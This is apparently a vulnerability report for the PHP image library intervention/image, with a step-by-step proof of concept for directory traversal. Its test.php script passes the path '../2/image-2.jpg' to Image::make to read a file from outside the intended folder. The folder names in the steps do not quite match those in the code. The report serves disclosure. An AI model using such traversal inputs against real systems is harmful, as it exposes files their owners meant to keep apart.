# Description

`intervention/image` is an image handling and manipulation library. This package is vulnerable to Directory Traversal attack.

# POC

1. Create a project dir in your htdocs folder
2. Install the package using composer. [here](http://image.intervention.io/getting_started/installation)
3. Create the below folder structure where our images will be stored on your project root dir
```
uploads
-> first-folder
--> image-1.jpg
-> second-folder
--> image-2.jpg
```
4. Create a test.php file on your project root dir then copy and paste this code below
```
<?php

require 'vendor/autoload.php';

$imageFilename = '../2/image-2.jpg';

// import the Intervention Image Manager Class
use Intervention\Image\ImageManagerStatic as Image;

// open an image file
$img = Image::make('uploads/1/'.$imageFilename);

// now you are able to resize the instance
$img->resize(320, 240);

// finally we save the image as a new file
$img->save('uploads/1/newphoto.jpeg');
```
5. Open terminal in your project root dir, then run command `php test.php`
6. Verify that the image is now on your `uploads/1/newphoto.jpeg` folder which is belongs to `uploads/2/image-2.jpeg`



